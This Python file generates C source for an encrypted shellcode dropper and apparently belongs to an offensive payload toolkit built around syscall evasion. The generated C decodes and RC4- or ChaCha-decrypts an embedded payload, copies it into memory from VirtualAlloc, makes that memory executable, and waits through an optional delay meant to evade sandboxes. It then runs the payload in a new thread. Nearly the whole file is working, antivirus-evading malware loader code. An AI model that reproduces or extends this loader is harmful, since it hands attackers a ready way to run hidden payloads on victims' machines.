#!/usr/bin/env python3
# -*- coding: utf-8 -*-

"""Generate C source for a minimal encrypted shellcode dropper (Win32 API, no syscalls)."""

from __future__ import annotations

from lib.compile.syscall_evasion import SyscallEvasionBuilder, _to_c_string


class EncryptedDropperBuilder(SyscallEvasionBuilder):
    """Build a VirtualAlloc-based loader with the same encryption as syscall evasion."""

    def build_source(self, encoded_payload: str, key: bytes, iv=None) -> str:
        headers = ['#include <windows.h>', '#include "base64.h"']
        if self.cipher == "rc4":
            headers.append('#include "rc4.h"')
        else:
            headers.append('#include "chacha.h"')

        sleep_block = ""
        if self.sleep_ms > 0:
            sleep_block = f"for (int i = 0; i < 10; i++) {{ Sleep({self.sleep_ms} / 10); }}"

        decrypt_block = ""
        if self.cipher == "rc4":
            decrypt_block = f"""
            {_to_c_string(key, "key")}
            RC4(key, shellcode, exec_mem, size);
"""
        else:
            if iv is None:
                raise ValueError("iv is required for chacha cipher")
            decrypt_block = f"""
            {_to_c_string(key, "key")}
            {_to_c_string(iv, "iv")}
            chacha_ctx ctx;
            chacha_keysetup(&ctx, key, 256, 96);
            chacha_ivsetup(&ctx, iv);
            chacha_encrypt_bytes(&ctx, shellcode, exec_mem, size);
"""

        return f"""
{chr(10).join(headers)}

char* enc_shellcode = "{encoded_payload}";

DWORD WINAPI run_shellcode(LPVOID param)
{{
    ((void(*)())param)();
    return 0;
}}

int main(void)
{{
    int b64len = (int)strlen(enc_shellcode);
    PBYTE shellcode = (PBYTE)malloc(b64len);
    if (!shellcode) return 1;

    SIZE_T size = (SIZE_T)base64decode(shellcode, enc_shellcode, b64len);
    if (size <= 0) return 1;

    PVOID exec_mem = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!exec_mem) return 1;

{decrypt_block}
    DWORD old = 0;
    if (!VirtualProtect(exec_mem, size, PAGE_EXECUTE_READ, &old)) return 1;

    {sleep_block}

    HANDLE thread = CreateThread(NULL, 0, run_shellcode, exec_mem, 0, NULL);
    if (!thread) return 1;
    WaitForSingleObject(thread, INFINITE);
    CloseHandle(thread);
    VirtualFree(exec_mem, 0, MEM_RELEASE);
    free(shellcode);
    return 0;
}}
"""
